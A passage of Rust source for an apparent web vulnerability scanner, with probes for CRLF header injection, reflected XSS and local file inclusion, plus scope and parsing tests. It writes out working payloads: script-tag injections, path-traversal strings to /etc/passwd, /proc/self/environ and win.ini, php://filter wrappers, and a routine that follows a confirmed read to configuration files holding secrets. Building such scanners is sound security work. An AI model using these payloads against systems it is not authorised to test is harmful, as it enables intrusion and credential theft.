            format!("{base}%0d%0aX-Cfx-Inj: {marker}"),
        ]
    };
    for pl in payloads {
        let hit = |r: &Option<Resp>| {
            r.as_ref()
                .and_then(|x| x.header("x-cfx-inj"))
                .map(|v| v == marker)
                .unwrap_or(false)
        };
        let r1 = send_site(client, site, &pl).await;
        if hit(&r1) {
            let r2 = send_site(client, site, &pl).await;
            if hit(&r2) {
                return Some(finding(
                    "crlf",
                    "CRLF / HTTP response header injection",
                    "high",
                    site,
                    format!(
                        "A CR/LF sequence injected into the {} was copied into the response headers (our injected `X-Cfx-Inj` header appeared), so an attacker can inject arbitrary response headers - session fixation via `Set-Cookie`, cache poisoning, or response splitting.",
                        site.where_label()
                    ),
                ));
            }
        }
    }
    None
}

async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
    let marker = format!("cfx{}z{}", site.url.len(), site.param.len());
    let plain = send_site(client, site, &marker).await?;
    if !plain.body.contains(&marker) {
        return None; // not reflected at all
    }
    // SOUND oracle: every payload injects a full HTML TAG carrying an event handler, and the detector
    // is that ENTIRE tag. It fires ONLY when the tag reflects with `<`, the tag name, and `>` all raw
    // (a genuine markup breakout). We deliberately do NOT use payloads that need no structural char - a
    // bare `onfocus=`/`onmouseover=` "unquoted-attribute" string, or a `';alert()//` JS-string break -
    // because those match ANY raw reflection, including a value echoed as plain text inside an error
    // page. On an app that HTML-encodes `<`/`>`/`"` (e.g. ASP.NET default), those strings still reflect
    // verbatim and produced a FALSE POSITIVE; requiring the intact `<tag ...>` makes the app's encoding
    // of `<`/`>` the discriminator, which is exactly what determines exploitability.
    let m = &marker;
    let cases: [(&str, String, String); 3] = [
        (
            "HTML",
            format!("{m}\"'><img src=x onerror=alert({m})>"),
            format!("<img src=x onerror=alert({m})>"),
        ),
        (
            "HTML",
            format!("{m}\"'><svg onload=alert({m})>"),
            format!("<svg onload=alert({m})>"),
        ),
        (
            "<script>",
            format!("{m}</script><svg onload=alert({m})>"),
            format!("</script><svg onload=alert({m})>"),
        ),
    ];
    for (ctx, payload, detector) in &cases {
        let r = send_site(client, site, payload).await;
        if r.map(|x| x.body.contains(detector.as_str()))
            .unwrap_or(false)
        {
            let again = send_site(client, site, payload).await;
            if again
                .map(|x| x.body.contains(detector.as_str()))
                .unwrap_or(false)
            {
                return Some(finding(
                    "xss",
                    "Reflected cross-site scripting (XSS)",
                    "high",
                    site,
                    format!(
                        "A payload injected into the {} was reflected into the {} response with `<`, `>` and the tag intact (`{}` appears raw and unescaped), so the injected markup executes in the victim's browser.",
                        site.where_label(),
                        ctx,
                        detector
                    ),
                ));
            }
        }
    }
    None
}

// ---------------------------------------------------------------- LFI / traversal
/// What a response leaked for a given LFI payload, or None. Handles Unix/Windows file reads,
/// `/proc/self/environ` disclosure, and PHP source via the `php://filter` wrapper (raw `<?php` or its
/// base64 signature `PD9waHA`).
/// What a response leaked, given what the endpoint says WITHOUT a payload.
///
/// Every branch requires the marker to be absent from the baseline, because a
/// page that already contains it proves nothing. That is not hypothetical: the
/// php:// branch reported seven file-read findings against a static
/// `mutillidae-test-scripts.txt`, a documentation file full of `<?php`
/// examples, which contains the marker no matter what we send.
fn lfi_leak(payload: &str, body: &str, baseline: &str) -> Option<&'static str> {
    let win = |b: &str| {
        b.contains("[extensions]") || b.contains("[fonts]") || b.contains("for 16-bit app support")
    };
    let environ = |b: &str| {
        b.contains("HTTP_HOST=")
            || b.contains("HTTP_USER_AGENT=")
            || (b.contains("PATH=") && b.contains("PWD="))
    };
    let php = |b: &str| b.contains("<?php") || b.contains("<?=") || b.contains("PD9waHA");

    if is_passwd(body) && !is_passwd(baseline) {
        return Some("/etc/passwd");
    }
    if win(body) && !win(baseline) {
        return Some("windows/win.ini");
    }
    if payload.contains("self/environ") && environ(body) && !environ(baseline) {
        return Some("/proc/self/environ");
    }
    if payload.starts_with("php://") && php(body) && !php(baseline) {
        return Some("PHP source via php:// wrapper");
    }
    None
}

async fn probe_lfi(client: &Client, site: &Site, baseline: &Resp) -> Option<Value> {
    if is_passwd(&baseline.body) {
        return None;
    }
    let payloads = [
        "../../../../../../../../etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        // process environment (often readable when /etc/passwd is not, and leaks secrets/session)
        "../../../../../../../../proc/self/environ",
        // Windows: relative traversal + absolute paths
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "C:/windows/win.ini",
        // PHP wrapper source disclosure (raw + base64)
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/resource=index.php",
    ];
    // Four spellings first, the rest only if one of them moved the page.
    //
    // This oracle is the most expensive in the engine: measured over eight
    // sites it was 59 of about 129 engine-seconds, because it is the longest
    // payload list and every one of them is a round trip against a target that
    // takes a quarter of a second to answer under a pass.
    //
    // The four cover the distinct techniques - unix relative, unix absolute, a
    // PHP wrapper, Windows absolute - and the rule for spending the other six is
    // that SOMETHING has to have happened. A parameter that is used to build a
    // path cannot be handed `../../etc/passwd` and answer exactly as it did for
    // its own value: it either includes something, or fails to, and either way
    // the page changes. A parameter that answers identically is not a file path,
    // and the encoding variants of a technique that produced no reaction at all
    // are not going to produce one.
    //
    // The bypass variants stay reachable where they matter. An application that
    // strips `../` still answers differently to `etc/passwd` than to its own
    // value, so the door opens and `....//` gets its turn.
    let first: &[&str] = &[
        "../../../../../../../../etc/passwd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "C:\\windows\\win.ini",
    ];
    let mut moved = false;
    let mut order: Vec<&str> = first.to_vec();
    order.extend(payloads.iter().filter(|p| !first.contains(p)));
    let cheap = first.len();

    // Sending the list concurrently was tried and reverted: over the same five
    // endpoints it took the pass from 123s to 215s, tripled the pacer's
    // back-off and pushed SQL injection from 64 engine-seconds to 337 as
    // everything queued behind the burst. The per-host ceiling was not idle.
    //
    // A failed request still costs that payload and not the rest, which is what
    // hid Mutillidae's `?page=` file read when the probe aborted on a timeout.
    for (i, p) in order.iter().enumerate() {
        if i == cheap && !moved {
            // Nothing reacted to any technique. The remaining payloads are
            // spellings of techniques that just produced no reaction.
            break;
        }
        let Some(r) = send_site(client, site, p).await else {
            continue;
        };
        if !moved && page_reacted(&r, baseline) {
            moved = true;
        }
        if let Some(what) = lfi_leak(p, &r.body, &baseline.body) {
            let Some(again) = send_site(client, site, p).await else {
                continue;
            };
            if lfi_leak(p, &again.body, &baseline.body).is_some() {
                // `/etc/passwd` proves the bug and is worth nothing to an
                // attacker. What it is worth is the file next to it, so look -
                // briefly, and only now. See `secrets`.
                let reached = lfi_reach_secrets(client, site, p, baseline).await;
                let severity = if reached.is_empty() {
                    "high"
                } else {
                    "critical"
                };
                let mut f = Finding::new(
                    "cortex-inject",
                    "lfi",
                    "Local file inclusion / path traversal",
                    severity,
                    &site.url,
                )
                .method(&site.method)
                .param(&site.param)
                .location(&site.where_label())
                .describe(format!(
                    "A traversal/wrapper payload in the {} returned `{what}` -- the parameter \
                     is used to build a file path without containment.{}",
                    site.where_label(),
                    secrets_sentence(&reached)
                ));
                if !reached.is_empty() {
                    f = f
                        .with("secrets_reachable", json!(reached))
                        .with("chained", json!(true));
                }
                return Some(f.build());
            }
        }
    }
    None
}

/// Did the endpoint answer this payload differently from its own value?
///
/// Deliberately coarse: a different status, or a body whose size moved past the
/// noise a dynamic page makes on its own. It is not evidence of a leak - that is
/// `lfi_leak`'s job - only evidence that the parameter reaches something that
/// cares what it says.
fn page_reacted(r: &Resp, baseline: &Resp) -> bool {
    if r.status != baseline.status {
        return true;
    }
    let a = baseline.body.len() as i64;
    let b = r.body.len() as i64;
    // Tokens and timestamps wobble a page by a few bytes; 2% or 64 bytes,
    // whichever is larger, is past that on any real page.
    (a - b).abs() > (a / 50).max(64)
}

/// Follow a confirmed file read to the application's own configuration.
///
/// Bounded: the files in `secrets::SECRET_FILES` at up to `secrets::DEPTHS`
/// levels up, and it stops at the first depth that answers for a given file. On
/// an endpoint with no traversal this costs nothing, because it is only reached
/// after a leak has been confirmed twice.
async fn lfi_reach_secrets(
    client: &Client,
    site: &Site,
    worked: &str,
    baseline: &Resp,
) -> Vec<Value> {
    let Some(style) = crate::secrets::traversal_style(worked) else {
        // An absolute path proved the read without proving a traversal
        // spelling, so there is nothing to reuse and nothing to guess.
        return Vec::new();
    };
    // Once per (host, parameter). A routing parameter gives the same sink a
    // dozen URLs, and this escalation costs eighteen requests each time.
    let key = format!("{}|{}", host_of(&site.url), site.param);
    if let Some(cached) = crate::secrets::cached_reach(&key) {
        return cached;
    }
    let mut out = Vec::new();
    for f in crate::secrets::SECRET_FILES {
        for depth in 0..crate::secrets::DEPTHS {
            let payload = format!("{}{}", style.repeat(depth), f.path);
            let Some(r) = send_site(client, site, &payload).await else {
                continue;
            };
            if let Some(keys) = crate::secrets::is_the_file(f, &r.body, &baseline.body) {
                out.push(json!({
                    "file": f.label,
                    "path": payload,
                    // Names only. The values arrived; they are not written down.
                    "keys": keys,
                }));
                break;
            }
        }
    }
    crate::secrets::remember_reach(&key, &out);
    out
}

/// The sentence a reachable config file adds to an LFI finding.
fn secrets_sentence(reached: &[Value]) -> String {
    if reached.is_empty() {
        return " No application configuration file was reachable from this parameter at the \
                depths tried, so the read is confined to what the traversal already showed."
            .to_string();
    }
    let names: Vec<&str> = reached
        .iter()
        .filter_map(|v| v.get("file").and_then(|s| s.as_str()))
        .collect();
    format!(
        " It also reads the application's own configuration ({}), which is the escalation: the \
         credentials in those files are the database, the session signing key and whatever cloud \
         account the deployment runs as, and none of them are rotated by fixing this parameter. \
         Treat every secret in them as disclosed and rotate first. Only the key NAMES are recorded \
         here - the values arrived in the response and are deliberately not written into this \
         finding, an export or a report.",
        names.join(", ")
    )
}

// ---------------------------------------------------------------- helpers
/// True if the true/false responses split cleanly around the baseline. `min_diff` is the noise floor
/// derived from baseline jitter (dynamic pages with tokens/timestamps wobble in size), so a page that
/// merely varies run-to-run does not read as a boolean oracle. Accepts EITHER direction: usually the
/// true (baseline-equivalent) branch is the larger one (row present vs absent), but some apps render
/// more on the false branch, so we anchor on "one branch tracks the baseline, the other diverges past
/// the split" rather than assuming true > false.
fn boolean_differential(baseline: &Resp, t: &Resp, f: &Resp, min_diff: i64) -> bool {
    if !(200..500).contains(&t.status) || !(200..500).contains(&f.status) {
        return false;
    }
    let lb = baseline.body.len() as i64;
    let (lt, lf) = (t.body.len() as i64, f.body.len() as i64);
    let diff = (lt - lf).abs();
    if diff < min_diff.max(16) {
        return false;
    }
    let t_side = lt >= lf && (lt - lb).abs() <= diff; // true tracks baseline, false shrank
    let f_side = lf > lt && (lf - lb).abs() <= diff; // false tracks baseline, true shrank
    t_side || f_side
}

fn finding(class: &str, name: &str, severity: &str, site: &Site, detail: String) -> Value {
    Finding::new("cortex-inject", class, name, severity, &site.url)
        .method(&site.method)
        .param(&site.param)
        .location(match site.loc {
            Loc::Query => "query",
            Loc::Path => "path",
            Loc::Header => "header",
            _ => "body",
        })
        .describe(detail)
        .build()
}

fn query_param_names(url: &str) -> Vec<String> {
    let q = match url.split_once('?') {
        Some((_, q)) => q.split('#').next().unwrap_or(q),
        None => return Vec::new(),
    };
    let mut out = Vec::new();
    for pair in q.split('&').filter(|s| !s.is_empty()) {
        let k = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        if !k.is_empty() && !out.contains(&k.to_string()) {
            out.push(k.to_string());
        }
    }
    out
}

fn current_value(url: &str, param: &str) -> Option<String> {
    let q = url
        .split_once('?')
        .map(|(_, q)| q.split('#').next().unwrap_or(q))?;
    for pair in q.split('&') {
        if let Some((k, v)) = pair.split_once('=') {
            if k == param {
                return Some(pct_decode(v));
            }
        } else if pair == param {
            return Some(String::new());
        }
    }
    None
}

fn set_param(url: &str, param: &str, value: &str) -> String {
    let (base, frag) = match url.split_once('#') {
        Some((b, f)) => (b, Some(f)),
        None => (url, None),
    };
    let (path, query) = match base.split_once('?') {
        Some((p, q)) => (p, q),
        None => (base, ""),
    };
    let enc = pct_encode(value);
    let mut parts: Vec<String> = Vec::new();
    let mut replaced = false;
    for pair in query.split('&').filter(|s| !s.is_empty()) {
        let k = pair.split_once('=').map(|(k, _)| k).unwrap_or(pair);
        if k == param {
            parts.push(format!("{param}={enc}"));
            replaced = true;
        } else {
            parts.push(pair.to_string());
        }
    }
    if !replaced {
        parts.push(format!("{param}={enc}"));
    }
    let mut out = format!("{path}?{}", parts.join("&"));
    if let Some(f) = frag {
        out.push('#');
        out.push_str(f);
    }
    out
}

use crate::probe::{is_passwd, is_sql_error};
use regex::Regex;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;
#[cfg(test)]
mod scope_tests {
    use super::{in_scope, port_of};

    fn none() -> crate::scope::Scope {
        crate::scope::Scope::default()
    }

    #[test]
    fn an_off_site_form_action_is_refused() {
        let target = "http://127.0.0.1:7012/";
        assert!(in_scope(
            target,
            "http://127.0.0.1:7012/index.php?page=a",
            &none()
        ));
        assert!(in_scope(target, "http://127.0.0.1:7012/x", &none()));
        assert!(!in_scope(
            target,
            "https://www.paypal.com/cgi-bin/webscr",
            &none()
        ));
        assert!(!in_scope(target, "https://evil.example/collect", &none()));
    }

    #[test]
    fn a_port_difference_on_the_named_host_is_still_in_scope() {
        assert!(in_scope(
            "http://app.test/",
            "http://app.test:8443/api",
            &none()
        ));
    }

    #[test]
    fn an_authorised_destination_is_admitted_and_only_that_one() {
        let target = "http://app.test/";
        let (s, _) = crate::scope::parse(&["10.0.0.0/8".to_string()]);
        assert!(in_scope(target, "http://10.1.2.3:6379/", &s));
        // Still refused: the list said one range, not "anything but the target".
        assert!(!in_scope(target, "https://www.paypal.com/x", &s));
        assert!(!in_scope(target, "http://172.16.0.1/", &s));
    }

    #[test]
    fn the_paypal_case_stays_refused_under_a_realistic_list() {
        let target = "http://app.test/";
        let (s, _) = crate::scope::parse(&[
            "*.app.test".to_string(),
            "10.0.0.0/8".to_string(),
            "redis.internal:6379".to_string(),
        ]);
        assert!(!in_scope(
            target,
            "https://www.paypal.com/cgi-bin/webscr",
            &s
        ));
        assert!(in_scope(target, "http://api.app.test/v1", &s));
        assert!(in_scope(target, "http://redis.internal:6379/", &s));
        // Named with a port, so another port on the same name is not authorised.
        assert!(!in_scope(target, "http://redis.internal:6380/", &s));
    }

    #[test]
    fn a_ports_scheme_default_is_what_a_rule_compares_against() {
        assert_eq!(port_of("https://api.example.com/x"), Some(443));
        assert_eq!(port_of("http://api.example.com/x"), Some(80));
        assert_eq!(port_of("http://api.example.com:8080/x"), Some(8080));
        assert_eq!(port_of("http://[::1]:6379/"), Some(6379));
        assert_eq!(port_of("http://[::1]/"), Some(80));
    }

    #[test]
    fn no_target_means_the_caller_is_trusted() {
        assert!(in_scope("", "https://anything.example/", &none()));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn json_body_keeps_baseline_fields_typed_and_fuzzes_as_string() {
        // name (string, fuzzed) + ownerId (integer) + enabled (boolean) + tags (array).
        let site = Site {
            method: "POST".into(),
            url: "https://api.x/pets".into(),
            loc: Loc::BodyJson,
            param: "name".into(),
            base_value: "test".into(),
            body: vec![
                ("name".into(), "test".into(), Some("string".into())),
                ("ownerId".into(), "1".into(), Some("integer".into())),
                ("enabled".into(), "true".into(), Some("boolean".into())),
                ("tags".into(), "[]".into(), Some("array".into())),
            ],
            path_idx: 0,
        };
        let (_url, body) = site.render("' OR '1'='1");
        let (raw, ct) = body.expect("json body");
        assert_eq!(ct, "application/json");
        let v: Value = serde_json::from_str(&raw).unwrap();
        // fuzzed field is the payload string
        assert_eq!(v["name"], Value::String("' OR '1'='1".into()));
        // baseline fields keep their declared JSON types
        assert_eq!(v["ownerId"], Value::from(1i64));
        assert_eq!(v["enabled"], Value::Bool(true));
        assert_eq!(v["tags"], serde_json::json!([]));
    }
}

#[cfg(test)]
mod hint_tests {
    use super::*;

    #[test]
    fn a_one_letter_hint_does_not_match_every_word_containing_it() {
        // REDIRECT_HINT carries "u", "r" and "to". Substring matching made
        // these three redirect parameters, and the class paid four requests a
        // site for each of them on every target.
        for name in ["username", "password", "author", "quantity"] {
            assert!(
                !hint_matches(name, REDIRECT_HINT),
                "{name} should not read as a redirect parameter"
            );
        }
    }

    #[test]
    fn the_parameters_the_list_is_for_still_match() {
        for name in ["url", "redirect_uri", "returnto", "next", "goto", "page"] {
            assert!(hint_matches(name, REDIRECT_HINT), "{name} should match");
        }
        // And a genuinely short one, spelled exactly.
        assert!(hint_matches("to", REDIRECT_HINT));
        assert!(hint_matches("u", REDIRECT_HINT));
    }

    #[test]
    fn ssrf_hints_are_words_and_behave_the_same() {
        assert!(hint_matches("callback_url", SSRF_HINT));
        assert!(!hint_matches("firstname", SSRF_HINT));
    }
}
